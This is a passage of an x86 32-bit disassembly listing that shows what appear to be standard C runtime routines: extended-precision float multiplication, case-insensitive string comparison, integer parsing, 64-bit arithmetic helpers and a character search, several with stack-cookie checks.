  417501:	eb 02                	jmp    0x417505
  417503:	8b de                	mov    %esi,%ebx
  417505:	48                   	dec    %eax
  417506:	f7 d8                	neg    %eax
  417508:	1b c0                	sbb    %eax,%eax
  41750a:	25 03 01 00 00       	and    $0x103,%eax
  41750f:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  417512:	51                   	push   %ecx
  417513:	40                   	inc    %eax
  417514:	50                   	push   %eax
  417515:	ff 75 fc             	push   -0x4(%ebp)
  417518:	53                   	push   %ebx
  417519:	ff 15 4c 80 41 00    	call   *0x41804c
  41751f:	8d 65 ac             	lea    -0x54(%ebp),%esp
  417522:	5f                   	pop    %edi
  417523:	5e                   	pop    %esi
  417524:	5b                   	pop    %ebx
  417525:	c9                   	leave
  417526:	c3                   	ret
  417527:	55                   	push   %ebp
  417528:	8b ec                	mov    %esp,%ebp
  41752a:	83 ec 28             	sub    $0x28,%esp
  41752d:	a1 10 62 45 00       	mov    0x456210,%eax
  417532:	33 45 04             	xor    0x4(%ebp),%eax
  417535:	53                   	push   %ebx
  417536:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  417539:	89 45 fc             	mov    %eax,-0x4(%ebp)
  41753c:	33 c0                	xor    %eax,%eax
  41753e:	33 c9                	xor    %ecx,%ecx
  417540:	66 8b 4b 0a          	mov    0xa(%ebx),%cx
  417544:	56                   	push   %esi
  417545:	8b 75 08             	mov    0x8(%ebp),%esi
  417548:	89 45 e8             	mov    %eax,-0x18(%ebp)
  41754b:	89 45 d8             	mov    %eax,-0x28(%ebp)
  41754e:	89 45 dc             	mov    %eax,-0x24(%ebp)
  417551:	89 45 e0             	mov    %eax,-0x20(%ebp)
  417554:	66 8b 46 0a          	mov    0xa(%esi),%ax
  417558:	57                   	push   %edi
  417559:	8b f9                	mov    %ecx,%edi
  41755b:	ba ff 7f 00 00       	mov    $0x7fff,%edx
  417560:	23 ca                	and    %edx,%ecx
  417562:	33 f8                	xor    %eax,%edi
  417564:	23 c2                	and    %edx,%eax
  417566:	81 e7 00 80 00 00    	and    $0x8000,%edi
  41756c:	66 3d ff 7f          	cmp    $0x7fff,%ax
  417570:	8d 14 01             	lea    (%ecx,%eax,1),%edx
  417573:	89 55 08             	mov    %edx,0x8(%ebp)
  417576:	0f 83 b8 01 00 00    	jae    0x417734
  41757c:	66 81 f9 ff 7f       	cmp    $0x7fff,%cx
  417581:	0f 83 ad 01 00 00    	jae    0x417734
  417587:	66 81 fa fd bf       	cmp    $0xbffd,%dx
  41758c:	0f 87 a2 01 00 00    	ja     0x417734
  417592:	66 81 fa bf 3f       	cmp    $0x3fbf,%dx
  417597:	77 04                	ja     0x41759d
  417599:	33 c0                	xor    %eax,%eax
  41759b:	eb 3a                	jmp    0x4175d7
  41759d:	66 85 c0             	test   %ax,%ax
  4175a0:	ba ff ff ff 7f       	mov    $0x7fffffff,%edx
  4175a5:	75 18                	jne    0x4175bf
  4175a7:	ff 45 08             	incl   0x8(%ebp)
  4175aa:	33 c0                	xor    %eax,%eax
  4175ac:	85 56 08             	test   %edx,0x8(%esi)
  4175af:	75 10                	jne    0x4175c1
  4175b1:	39 46 04             	cmp    %eax,0x4(%esi)
  4175b4:	75 0b                	jne    0x4175c1
  4175b6:	39 06                	cmp    %eax,(%esi)
  4175b8:	75 07                	jne    0x4175c1
  4175ba:	e9 6f 01 00 00       	jmp    0x41772e
  4175bf:	33 c0                	xor    %eax,%eax
  4175c1:	66 3b c8             	cmp    %ax,%cx
  4175c4:	75 1e                	jne    0x4175e4
  4175c6:	ff 45 08             	incl   0x8(%ebp)
  4175c9:	85 53 08             	test   %edx,0x8(%ebx)
  4175cc:	75 16                	jne    0x4175e4
  4175ce:	39 43 04             	cmp    %eax,0x4(%ebx)
  4175d1:	75 11                	jne    0x4175e4
  4175d3:	39 03                	cmp    %eax,(%ebx)
  4175d5:	75 0d                	jne    0x4175e4
  4175d7:	89 46 08             	mov    %eax,0x8(%esi)
  4175da:	89 46 04             	mov    %eax,0x4(%esi)
  4175dd:	89 06                	mov    %eax,(%esi)
  4175df:	e9 6b 01 00 00       	jmp    0x41774f
  4175e4:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4175e7:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4175ea:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4175ed:	c7 45 0c 05 00 00 00 	movl   $0x5,0xc(%ebp)
  4175f4:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4175f7:	03 c0                	add    %eax,%eax
  4175f9:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  4175fd:	7e 49                	jle    0x417648
  4175ff:	03 c6                	add    %esi,%eax
  417601:	89 45 f4             	mov    %eax,-0xc(%ebp)
  417604:	8b 45 0c             	mov    0xc(%ebp),%eax
  417607:	8d 4b 08             	lea    0x8(%ebx),%ecx
  41760a:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  41760d:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  417610:	8b 45 f0             	mov    -0x10(%ebp),%eax
  417613:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  417616:	0f b7 09             	movzwl (%ecx),%ecx
  417619:	0f b7 00             	movzwl (%eax),%eax
  41761c:	0f af c1             	imul   %ecx,%eax
  41761f:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  417622:	83 c1 fc             	add    $0xfffffffc,%ecx
  417625:	51                   	push   %ecx
  417626:	50                   	push   %eax
  417627:	ff 31                	push   (%ecx)
  417629:	e8 21 e8 ff ff       	call   0x415e4f
  41762e:	83 c4 0c             	add    $0xc,%esp
  417631:	85 c0                	test   %eax,%eax
  417633:	74 06                	je     0x41763b
  417635:	8b 45 f8             	mov    -0x8(%ebp),%eax
  417638:	66 ff 00             	incw   (%eax)
  41763b:	83 45 f4 02          	addl   $0x2,-0xc(%ebp)
  41763f:	83 6d f0 02          	subl   $0x2,-0x10(%ebp)
  417643:	ff 4d e4             	decl   -0x1c(%ebp)
  417646:	75 c8                	jne    0x417610
  417648:	83 45 f8 02          	addl   $0x2,-0x8(%ebp)
  41764c:	ff 45 ec             	incl   -0x14(%ebp)
  41764f:	ff 4d 0c             	decl   0xc(%ebp)
  417652:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  417656:	7f 9c                	jg     0x4175f4
  417658:	81 45 08 02 c0 00 00 	addl   $0xc002,0x8(%ebp)
  41765f:	66 83 7d 08 00       	cmpw   $0x0,0x8(%ebp)
  417664:	7e 25                	jle    0x41768b
  417666:	f6 45 e3 80          	testb  $0x80,-0x1d(%ebp)
  41766a:	75 18                	jne    0x417684
  41766c:	8d 45 d8             	lea    -0x28(%ebp),%eax
  41766f:	50                   	push   %eax
  417670:	e8 59 e8 ff ff       	call   0x415ece
  417675:	81 45 08 ff ff 00 00 	addl   $0xffff,0x8(%ebp)
  41767c:	66 83 7d 08 00       	cmpw   $0x0,0x8(%ebp)
  417681:	59                   	pop    %ecx
  417682:	7f e2                	jg     0x417666
  417684:	66 83 7d 08 00       	cmpw   $0x0,0x8(%ebp)
  417689:	7f 39                	jg     0x4176c4
  41768b:	81 45 08 ff ff 00 00 	addl   $0xffff,0x8(%ebp)
  417692:	66 83 7d 08 00       	cmpw   $0x0,0x8(%ebp)
  417697:	7d 2b                	jge    0x4176c4
  417699:	8b 45 08             	mov    0x8(%ebp),%eax
  41769c:	f7 d8                	neg    %eax
  41769e:	0f b7 d8             	movzwl %ax,%ebx
  4176a1:	01 5d 08             	add    %ebx,0x8(%ebp)
  4176a4:	f6 45 d8 01          	testb  $0x1,-0x28(%ebp)
  4176a8:	74 03                	je     0x4176ad
  4176aa:	ff 45 e8             	incl   -0x18(%ebp)
  4176ad:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4176b0:	50                   	push   %eax
  4176b1:	e8 46 e8 ff ff       	call   0x415efc
  4176b6:	4b                   	dec    %ebx
  4176b7:	59                   	pop    %ecx
  4176b8:	75 ea                	jne    0x4176a4
  4176ba:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  4176be:	74 04                	je     0x4176c4
  4176c0:	80 4d d8 01          	orb    $0x1,-0x28(%ebp)
  4176c4:	66 81 7d d8 00 80    	cmpw   $0x8000,-0x28(%ebp)
  4176ca:	77 0f                	ja     0x4176db
  4176cc:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4176cf:	25 ff ff 01 00       	and    $0x1ffff,%eax
  4176d4:	3d 00 80 01 00       	cmp    $0x18000,%eax
  4176d9:	75 35                	jne    0x417710
  4176db:	83 7d da ff          	cmpl   $0xffffffff,-0x26(%ebp)
  4176df:	75 2c                	jne    0x41770d
  4176e1:	83 65 da 00          	andl   $0x0,-0x26(%ebp)
  4176e5:	83 7d de ff          	cmpl   $0xffffffff,-0x22(%ebp)
  4176e9:	75 1d                	jne    0x417708
  4176eb:	83 65 de 00          	andl   $0x0,-0x22(%ebp)
  4176ef:	66 81 7d e2 ff ff    	cmpw   $0xffff,-0x1e(%ebp)
  4176f5:	75 0b                	jne    0x417702
  4176f7:	ff 45 08             	incl   0x8(%ebp)
  4176fa:	66 c7 45 e2 00 80    	movw   $0x8000,-0x1e(%ebp)
  417700:	eb 0e                	jmp    0x417710
  417702:	66 ff 45 e2          	incw   -0x1e(%ebp)
  417706:	eb 08                	jmp    0x417710
  417708:	ff 45 de             	incl   -0x22(%ebp)
  41770b:	eb 03                	jmp    0x417710
  41770d:	ff 45 da             	incl   -0x26(%ebp)
  417710:	8b 45 08             	mov    0x8(%ebp),%eax
  417713:	66 3d ff 7f          	cmp    $0x7fff,%ax
  417717:	73 1b                	jae    0x417734
  417719:	66 8b 4d da          	mov    -0x26(%ebp),%cx
  41771d:	66 89 0e             	mov    %cx,(%esi)
  417720:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  417723:	89 4e 02             	mov    %ecx,0x2(%esi)
  417726:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  417729:	89 4e 06             	mov    %ecx,0x6(%esi)
  41772c:	0b c7                	or     %edi,%eax
  41772e:	66 89 46 0a          	mov    %ax,0xa(%esi)
  417732:	eb 1b                	jmp    0x41774f
  417734:	66 f7 df             	neg    %di
  417737:	1b ff                	sbb    %edi,%edi
  417739:	83 66 04 00          	andl   $0x0,0x4(%esi)
  41773d:	81 e7 00 00 00 80    	and    $0x80000000,%edi
  417743:	81 c7 00 80 ff 7f    	add    $0x7fff8000,%edi
  417749:	83 26 00             	andl   $0x0,(%esi)
  41774c:	89 7e 08             	mov    %edi,0x8(%esi)
  41774f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  417752:	33 4d 04             	xor    0x4(%ebp),%ecx
  417755:	5f                   	pop    %edi
  417756:	5e                   	pop    %esi
  417757:	5b                   	pop    %ebx
  417758:	e8 af c4 ff ff       	call   0x413c0c
  41775d:	c9                   	leave
  41775e:	c3                   	ret
  41775f:	55                   	push   %ebp
  417760:	8b ec                	mov    %esp,%ebp
  417762:	83 ec 10             	sub    $0x10,%esp
  417765:	a1 10 62 45 00       	mov    0x456210,%eax
  41776a:	33 45 04             	xor    0x4(%ebp),%eax
  41776d:	53                   	push   %ebx
  41776e:	bb 00 69 45 00       	mov    $0x456900,%ebx
  417773:	33 c9                	xor    %ecx,%ecx
  417775:	83 eb 60             	sub    $0x60,%ebx
  417778:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  41777b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  41777e:	74 5d                	je     0x4177dd
  417780:	7d 0b                	jge    0x41778d
  417782:	f7 5d 0c             	negl   0xc(%ebp)
  417785:	bb 60 6a 45 00       	mov    $0x456a60,%ebx
  41778a:	83 eb 60             	sub    $0x60,%ebx
  41778d:	39 4d 10             	cmp    %ecx,0x10(%ebp)
  417790:	75 06                	jne    0x417798
  417792:	8b 45 08             	mov    0x8(%ebp),%eax
  417795:	66 89 08             	mov    %cx,(%eax)
  417798:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  41779b:	74 40                	je     0x4177dd
  41779d:	56                   	push   %esi
  41779e:	57                   	push   %edi
  41779f:	8b 45 0c             	mov    0xc(%ebp),%eax
  4177a2:	c1 7d 0c 03          	sarl   $0x3,0xc(%ebp)
  4177a6:	83 e0 07             	and    $0x7,%eax
  4177a9:	83 c3 54             	add    $0x54,%ebx
  4177ac:	3b c1                	cmp    %ecx,%eax
  4177ae:	74 26                	je     0x4177d6
  4177b0:	8d 04 40             	lea    (%eax,%eax,2),%eax
  4177b3:	8d 34 83             	lea    (%ebx,%eax,4),%esi
  4177b6:	66 81 3e 00 80       	cmpw   $0x8000,(%esi)
  4177bb:	72 0c                	jb     0x4177c9
  4177bd:	8d 7d f0             	lea    -0x10(%ebp),%edi
  4177c0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4177c1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4177c2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4177c3:	ff 4d f2             	decl   -0xe(%ebp)
  4177c6:	8d 75 f0             	lea    -0x10(%ebp),%esi
  4177c9:	56                   	push   %esi
  4177ca:	ff 75 08             	push   0x8(%ebp)
  4177cd:	e8 55 fd ff ff       	call   0x417527
  4177d2:	59                   	pop    %ecx
  4177d3:	59                   	pop    %ecx
  4177d4:	33 c9                	xor    %ecx,%ecx
  4177d6:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  4177d9:	75 c4                	jne    0x41779f
  4177db:	5f                   	pop    %edi
  4177dc:	5e                   	pop    %esi
  4177dd:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4177e0:	33 4d 04             	xor    0x4(%ebp),%ecx
  4177e3:	5b                   	pop    %ebx
  4177e4:	e8 23 c4 ff ff       	call   0x413c0c
  4177e9:	c9                   	leave
  4177ea:	c3                   	ret
  4177eb:	cc                   	int3
  4177ec:	cc                   	int3
  4177ed:	cc                   	int3
  4177ee:	cc                   	int3
  4177ef:	cc                   	int3
  4177f0:	55                   	push   %ebp
  4177f1:	8b ec                	mov    %esp,%ebp
  4177f3:	57                   	push   %edi
  4177f4:	56                   	push   %esi
  4177f5:	53                   	push   %ebx
  4177f6:	8b 75 0c             	mov    0xc(%ebp),%esi
  4177f9:	8b 7d 08             	mov    0x8(%ebp),%edi
  4177fc:	b0 ff                	mov    $0xff,%al
  4177fe:	8b ff                	mov    %edi,%edi
  417800:	0a c0                	or     %al,%al
  417802:	74 32                	je     0x417836
  417804:	8a 06                	mov    (%esi),%al
  417806:	83 c6 01             	add    $0x1,%esi
  417809:	8a 27                	mov    (%edi),%ah
  41780b:	83 c7 01             	add    $0x1,%edi
  41780e:	38 c4                	cmp    %al,%ah
  417810:	74 ee                	je     0x417800
  417812:	2c 41                	sub    $0x41,%al
  417814:	3c 1a                	cmp    $0x1a,%al
  417816:	1a c9                	sbb    %cl,%cl
  417818:	80 e1 20             	and    $0x20,%cl
  41781b:	02 c1                	add    %cl,%al
  41781d:	04 41                	add    $0x41,%al
  41781f:	86 e0                	xchg   %ah,%al
  417821:	2c 41                	sub    $0x41,%al
  417823:	3c 1a                	cmp    $0x1a,%al
  417825:	1a c9                	sbb    %cl,%cl
  417827:	80 e1 20             	and    $0x20,%cl
  41782a:	02 c1                	add    %cl,%al
  41782c:	04 41                	add    $0x41,%al
  41782e:	38 e0                	cmp    %ah,%al
  417830:	74 ce                	je     0x417800
  417832:	1a c0                	sbb    %al,%al
  417834:	1c ff                	sbb    $0xff,%al
  417836:	0f be c0             	movsbl %al,%eax
  417839:	5b                   	pop    %ebx
  41783a:	5e                   	pop    %esi
  41783b:	5f                   	pop    %edi
  41783c:	c9                   	leave
  41783d:	c3                   	ret
  41783e:	56                   	push   %esi
  41783f:	57                   	push   %edi
  417840:	e8 81 b6 ff ff       	call   0x412ec6
  417845:	8b 78 64             	mov    0x64(%eax),%edi
  417848:	3b 3d 9c 64 45 00    	cmp    0x45649c,%edi
  41784e:	74 07                	je     0x417857
  417850:	e8 aa e0 ff ff       	call   0x4158ff
  417855:	8b f8                	mov    %eax,%edi
  417857:	8b 74 24 0c          	mov    0xc(%esp),%esi
  41785b:	83 7f 28 01          	cmpl   $0x1,0x28(%edi)
  41785f:	0f b6 06             	movzbl (%esi),%eax
  417862:	7e 0e                	jle    0x417872
  417864:	6a 08                	push   $0x8
  417866:	50                   	push   %eax
  417867:	57                   	push   %edi
  417868:	e8 af e1 ff ff       	call   0x415a1c
  41786d:	83 c4 0c             	add    $0xc,%esp
  417870:	eb 0a                	jmp    0x41787c
  417872:	8b 4f 48             	mov    0x48(%edi),%ecx
  417875:	0f b6 04 41          	movzbl (%ecx,%eax,2),%eax
  417879:	83 e0 08             	and    $0x8,%eax
  41787c:	85 c0                	test   %eax,%eax
  41787e:	74 03                	je     0x417883
  417880:	46                   	inc    %esi
  417881:	eb d8                	jmp    0x41785b
  417883:	0f b6 0e             	movzbl (%esi),%ecx
  417886:	46                   	inc    %esi
  417887:	83 f9 2d             	cmp    $0x2d,%ecx
  41788a:	8b d1                	mov    %ecx,%edx
  41788c:	74 05                	je     0x417893
  41788e:	83 f9 2b             	cmp    $0x2b,%ecx
  417891:	75 04                	jne    0x417897
  417893:	0f b6 0e             	movzbl (%esi),%ecx
  417896:	46                   	inc    %esi
  417897:	33 c0                	xor    %eax,%eax
  417899:	83 f9 30             	cmp    $0x30,%ecx
  41789c:	7c 0a                	jl     0x4178a8
  41789e:	83 f9 39             	cmp    $0x39,%ecx
  4178a1:	7f 05                	jg     0x4178a8
  4178a3:	83 e9 30             	sub    $0x30,%ecx
  4178a6:	eb 03                	jmp    0x4178ab
  4178a8:	83 c9 ff             	or     $0xffffffff,%ecx
  4178ab:	83 f9 ff             	cmp    $0xffffffff,%ecx
  4178ae:	74 0c                	je     0x4178bc
  4178b0:	8d 04 80             	lea    (%eax,%eax,4),%eax
  4178b3:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  4178b6:	0f b6 0e             	movzbl (%esi),%ecx
  4178b9:	46                   	inc    %esi
  4178ba:	eb dd                	jmp    0x417899
  4178bc:	83 fa 2d             	cmp    $0x2d,%edx
  4178bf:	5f                   	pop    %edi
  4178c0:	5e                   	pop    %esi
  4178c1:	75 02                	jne    0x4178c5
  4178c3:	f7 d8                	neg    %eax
  4178c5:	c3                   	ret
  4178c6:	cc                   	int3
  4178c7:	cc                   	int3
  4178c8:	cc                   	int3
  4178c9:	cc                   	int3
  4178ca:	cc                   	int3
  4178cb:	cc                   	int3
  4178cc:	cc                   	int3
  4178cd:	cc                   	int3
  4178ce:	cc                   	int3
  4178cf:	cc                   	int3
  4178d0:	8b 44 24 08          	mov    0x8(%esp),%eax
  4178d4:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4178d8:	0b c8                	or     %eax,%ecx
  4178da:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4178de:	75 09                	jne    0x4178e9
  4178e0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4178e4:	f7 e1                	mul    %ecx
  4178e6:	c2 10 00             	ret    $0x10
  4178e9:	53                   	push   %ebx
  4178ea:	f7 e1                	mul    %ecx
  4178ec:	8b d8                	mov    %eax,%ebx
  4178ee:	8b 44 24 08          	mov    0x8(%esp),%eax
  4178f2:	f7 64 24 14          	mull   0x14(%esp)
  4178f6:	03 d8                	add    %eax,%ebx
  4178f8:	8b 44 24 08          	mov    0x8(%esp),%eax
  4178fc:	f7 e1                	mul    %ecx
  4178fe:	03 d3                	add    %ebx,%edx
  417900:	5b                   	pop    %ebx
  417901:	c2 10 00             	ret    $0x10
  417904:	cc                   	int3
  417905:	cc                   	int3
  417906:	cc                   	int3
  417907:	cc                   	int3
  417908:	cc                   	int3
  417909:	cc                   	int3
  41790a:	cc                   	int3
  41790b:	cc                   	int3
  41790c:	cc                   	int3
  41790d:	cc                   	int3
  41790e:	cc                   	int3
  41790f:	cc                   	int3
  417910:	55                   	push   %ebp
  417911:	8b ec                	mov    %esp,%ebp
  417913:	57                   	push   %edi
  417914:	56                   	push   %esi
  417915:	53                   	push   %ebx
  417916:	8b 4d 10             	mov    0x10(%ebp),%ecx
  417919:	0b c9                	or     %ecx,%ecx
  41791b:	74 4d                	je     0x41796a
  41791d:	8b 75 08             	mov    0x8(%ebp),%esi
  417920:	8b 7d 0c             	mov    0xc(%ebp),%edi
  417923:	b7 41                	mov    $0x41,%bh
  417925:	b3 5a                	mov    $0x5a,%bl
  417927:	b6 20                	mov    $0x20,%dh
  417929:	8d 49 00             	lea    0x0(%ecx),%ecx
  41792c:	8a 26                	mov    (%esi),%ah
  41792e:	0a e4                	or     %ah,%ah
  417930:	8a 07                	mov    (%edi),%al
  417932:	74 27                	je     0x41795b
  417934:	0a c0                	or     %al,%al
  417936:	74 23                	je     0x41795b
  417938:	83 c6 01             	add    $0x1,%esi
  41793b:	83 c7 01             	add    $0x1,%edi
  41793e:	38 fc                	cmp    %bh,%ah
  417940:	72 06                	jb     0x417948
  417942:	38 dc                	cmp    %bl,%ah
  417944:	77 02                	ja     0x417948
  417946:	02 e6                	add    %dh,%ah
  417948:	38 f8                	cmp    %bh,%al
  41794a:	72 06                	jb     0x417952
  41794c:	38 d8                	cmp    %bl,%al
  41794e:	77 02                	ja     0x417952
  417950:	02 c6                	add    %dh,%al
  417952:	38 c4                	cmp    %al,%ah
  417954:	75 0b                	jne    0x417961
  417956:	83 e9 01             	sub    $0x1,%ecx
  417959:	75 d1                	jne    0x41792c
  41795b:	33 c9                	xor    %ecx,%ecx
  41795d:	38 c4                	cmp    %al,%ah
  41795f:	74 09                	je     0x41796a
  417961:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  417966:	72 02                	jb     0x41796a
  417968:	f7 d9                	neg    %ecx
  41796a:	8b c1                	mov    %ecx,%eax
  41796c:	5b                   	pop    %ebx
  41796d:	5e                   	pop    %esi
  41796e:	5f                   	pop    %edi
  41796f:	c9                   	leave
  417970:	c3                   	ret
  417971:	cc                   	int3
  417972:	cc                   	int3
  417973:	cc                   	int3
  417974:	cc                   	int3
  417975:	cc                   	int3
  417976:	cc                   	int3
  417977:	cc                   	int3
  417978:	cc                   	int3
  417979:	cc                   	int3
  41797a:	cc                   	int3
  41797b:	cc                   	int3
  41797c:	cc                   	int3
  41797d:	cc                   	int3
  41797e:	cc                   	int3
  41797f:	cc                   	int3
  417980:	56                   	push   %esi
  417981:	8b 44 24 14          	mov    0x14(%esp),%eax
  417985:	0b c0                	or     %eax,%eax
  417987:	75 28                	jne    0x4179b1
  417989:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  41798d:	8b 44 24 0c          	mov    0xc(%esp),%eax
  417991:	33 d2                	xor    %edx,%edx
  417993:	f7 f1                	div    %ecx
  417995:	8b d8                	mov    %eax,%ebx
  417997:	8b 44 24 08          	mov    0x8(%esp),%eax
  41799b:	f7 f1                	div    %ecx
  41799d:	8b f0                	mov    %eax,%esi
  41799f:	8b c3                	mov    %ebx,%eax
  4179a1:	f7 64 24 10          	mull   0x10(%esp)
  4179a5:	8b c8                	mov    %eax,%ecx
  4179a7:	8b c6                	mov    %esi,%eax
  4179a9:	f7 64 24 10          	mull   0x10(%esp)
  4179ad:	03 d1                	add    %ecx,%edx
  4179af:	eb 47                	jmp    0x4179f8
  4179b1:	8b c8                	mov    %eax,%ecx
  4179b3:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  4179b7:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4179bb:	8b 44 24 08          	mov    0x8(%esp),%eax
  4179bf:	d1 e9                	shr    %ecx
  4179c1:	d1 db                	rcr    %ebx
  4179c3:	d1 ea                	shr    %edx
  4179c5:	d1 d8                	rcr    %eax
  4179c7:	0b c9                	or     %ecx,%ecx
  4179c9:	75 f4                	jne    0x4179bf
  4179cb:	f7 f3                	div    %ebx
  4179cd:	8b f0                	mov    %eax,%esi
  4179cf:	f7 64 24 14          	mull   0x14(%esp)
  4179d3:	8b c8                	mov    %eax,%ecx
  4179d5:	8b 44 24 10          	mov    0x10(%esp),%eax
  4179d9:	f7 e6                	mul    %esi
  4179db:	03 d1                	add    %ecx,%edx
  4179dd:	72 0e                	jb     0x4179ed
  4179df:	3b 54 24 0c          	cmp    0xc(%esp),%edx
  4179e3:	77 08                	ja     0x4179ed
  4179e5:	72 0f                	jb     0x4179f6
  4179e7:	3b 44 24 08          	cmp    0x8(%esp),%eax
  4179eb:	76 09                	jbe    0x4179f6
  4179ed:	4e                   	dec    %esi
  4179ee:	2b 44 24 10          	sub    0x10(%esp),%eax
  4179f2:	1b 54 24 14          	sbb    0x14(%esp),%edx
  4179f6:	33 db                	xor    %ebx,%ebx
  4179f8:	2b 44 24 08          	sub    0x8(%esp),%eax
  4179fc:	1b 54 24 0c          	sbb    0xc(%esp),%edx
  417a00:	f7 da                	neg    %edx
  417a02:	f7 d8                	neg    %eax
  417a04:	83 da 00             	sbb    $0x0,%edx
  417a07:	8b ca                	mov    %edx,%ecx
  417a09:	8b d3                	mov    %ebx,%edx
  417a0b:	8b d9                	mov    %ecx,%ebx
  417a0d:	8b c8                	mov    %eax,%ecx
  417a0f:	8b c6                	mov    %esi,%eax
  417a11:	5e                   	pop    %esi
  417a12:	c2 10 00             	ret    $0x10
  417a15:	cc                   	int3
  417a16:	cc                   	int3
  417a17:	cc                   	int3
  417a18:	cc                   	int3
  417a19:	cc                   	int3
  417a1a:	cc                   	int3
  417a1b:	cc                   	int3
  417a1c:	cc                   	int3
  417a1d:	cc                   	int3
  417a1e:	cc                   	int3
  417a1f:	cc                   	int3
  417a20:	8d 42 ff             	lea    -0x1(%edx),%eax
  417a23:	5b                   	pop    %ebx
  417a24:	c3                   	ret
  417a25:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  417a2c:	8d 64 24 00          	lea    0x0(%esp),%esp
  417a30:	33 c0                	xor    %eax,%eax
  417a32:	8a 44 24 08          	mov    0x8(%esp),%al
  417a36:	53                   	push   %ebx
  417a37:	8b d8                	mov    %eax,%ebx
  417a39:	c1 e0 08             	shl    $0x8,%eax
  417a3c:	8b 54 24 08          	mov    0x8(%esp),%edx
  417a40:	f7 c2 03 00 00 00    	test   $0x3,%edx
  417a46:	74 15                	je     0x417a5d
  417a48:	8a 0a                	mov    (%edx),%cl
  417a4a:	83 c2 01             	add    $0x1,%edx
  417a4d:	38 d9                	cmp    %bl,%cl
  417a4f:	74 cf                	je     0x417a20
  417a51:	84 c9                	test   %cl,%cl
  417a53:	74 51                	je     0x417aa6
  417a55:	f7 c2 03 00 00 00    	test   $0x3,%edx
  417a5b:	75 eb                	jne    0x417a48
  417a5d:	0b d8                	or     %eax,%ebx
  417a5f:	57                   	push   %edi
  417a60:	8b c3                	mov    %ebx,%eax
  417a62:	c1 e3 10             	shl    $0x10,%ebx
  417a65:	56                   	push   %esi
  417a66:	0b d8                	or     %eax,%ebx
  417a68:	8b 0a                	mov    (%edx),%ecx
  417a6a:	bf ff fe fe 7e       	mov    $0x7efefeff,%edi
  417a6f:	8b c1                	mov    %ecx,%eax
  417a71:	8b f7                	mov    %edi,%esi
  417a73:	33 cb                	xor    %ebx,%ecx
  417a75:	03 f0                	add    %eax,%esi
  417a77:	03 f9                	add    %ecx,%edi
  417a79:	83 f1 ff             	xor    $0xffffffff,%ecx
  417a7c:	83 f0 ff             	xor    $0xffffffff,%eax
  417a7f:	33 cf                	xor    %edi,%ecx
  417a81:	33 c6                	xor    %esi,%eax
  417a83:	83 c2 04             	add    $0x4,%edx
  417a86:	81 e1 00 01 01 81    	and    $0x81010100,%ecx
  417a8c:	75 1c                	jne    0x417aaa
  417a8e:	25 00 01 01 81       	and    $0x81010100,%eax
  417a93:	74 d3                	je     0x417a68
  417a95:	25 00 01 01 01       	and    $0x1010100,%eax
  417a9a:	75 08                	jne    0x417aa4
  417a9c:	81 e6 00 00 00 80    	and    $0x80000000,%esi
  417aa2:	75 c4                	jne    0x417a68
  417aa4:	5e                   	pop    %esi
  417aa5:	5f                   	pop    %edi
  417aa6:	5b                   	pop    %ebx
  417aa7:	33 c0                	xor    %eax,%eax
  417aa9:	c3                   	ret
  417aaa:	8b 42 fc             	mov    -0x4(%edx),%eax
  417aad:	38 d8                	cmp    %bl,%al
  417aaf:	74 36                	je     0x417ae7
  417ab1:	84 c0                	test   %al,%al
  417ab3:	74 ef                	je     0x417aa4
  417ab5:	38 dc                	cmp    %bl,%ah
  417ab7:	74 27                	je     0x417ae0
  417ab9:	84 e4                	test   %ah,%ah
  417abb:	74 e7                	je     0x417aa4
  417abd:	c1 e8 10             	shr    $0x10,%eax
  417ac0:	38 d8                	cmp    %bl,%al
  417ac2:	74 15                	je     0x417ad9
  417ac4:	84 c0                	test   %al,%al
  417ac6:	74 dc                	je     0x417aa4
  417ac8:	38 dc                	cmp    %bl,%ah
  417aca:	74 06                	je     0x417ad2
  417acc:	84 e4                	test   %ah,%ah
  417ace:	74 d4                	je     0x417aa4
  417ad0:	eb 96                	jmp    0x417a68
  417ad2:	5e                   	pop    %esi
  417ad3:	5f                   	pop    %edi
  417ad4:	8d 42 ff             	lea    -0x1(%edx),%eax
  417ad7:	5b                   	pop    %ebx
  417ad8:	c3                   	ret
  417ad9:	8d 42 fe             	lea    -0x2(%edx),%eax
  417adc:	5e                   	pop    %esi
  417add:	5f                   	pop    %edi
  417ade:	5b                   	pop    %ebx
  417adf:	c3                   	ret
  417ae0:	8d 42 fd             	lea    -0x3(%edx),%eax
  417ae3:	5e                   	pop    %esi
  417ae4:	5f                   	pop    %edi
  417ae5:	5b                   	pop    %ebx
  417ae6:	c3                   	ret
  417ae7:	8d 42 fc             	lea    -0x4(%edx),%eax
  417aea:	5e                   	pop    %esi
  417aeb:	5f                   	pop    %edi
  417aec:	5b                   	pop    %ebx
